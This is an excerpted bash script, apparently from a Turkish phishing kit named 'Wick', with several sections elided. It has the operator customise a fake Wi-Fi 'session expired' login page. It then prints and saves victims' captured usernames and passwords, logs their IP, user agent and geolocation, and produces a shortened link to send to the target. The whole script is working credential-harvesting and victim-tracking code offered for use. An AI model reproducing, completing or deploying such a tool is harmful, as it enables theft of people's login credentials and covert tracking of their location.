...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir Platform Seçiniz: \e[0m' option
...
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Geliştirilmiş Phishing Tool ( Wick ) by Neo Holmes / spyhackerz.org \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m İletişim: Telegram - @neo_sp / Instagram - @itsmeneo.py \e[0m\n"
printf "  \e[101m\e[1;77mEğer bir sorun yaşarsanız benimle iletişime geçebilirsiniz. \e[0m\n"
printf "\n"
}
...
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Başlık 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Başlık 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username Kutusu (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Şifre Kutusu (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Onay Kutusu (Default: Log-In): \e[0m' sub_text
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Hesab:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Şifre:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Kaydedildi:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Diğer bilgiler için bekleniyor..\e[0m\n"
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Hedef IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Kaydedildi:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
...
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Host:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##
...
if [[ $continent != "" ]]; then
printf "\e[1;92m[*] Kıta:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Ülke:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] Eyalet:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] Şehir Lokasyonu:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##
...
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Adres Hızı:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] Para:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
...
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Server başlatılıyor...\e[0m\n"
...
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Hedef kişiye göndereceğiniz Link:\e[0m\e[1;77m %s \n' $send_link
...
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Tinyurl Kullanımı:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Port seçiniz (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
...
printf "\e[1;92m[\e[0m*\e[1;92m] Hedef kişiye göndereceğiniz Link:\e[0m\e[1;77m %s\e[0m\n" $link
...
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
...
start
#else
#printf "\e[1;93m [!] Yanlış seçenek!\e[0m\n"
#sleep 1
#clear
#start1
#fi
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] IP ve bilgiler için bekleniliyor,\e[0m\e[1;77m Çıkış yapmak için CTRL+C yapabilirsiniz..\e[0m\n"
while [ true ]; do
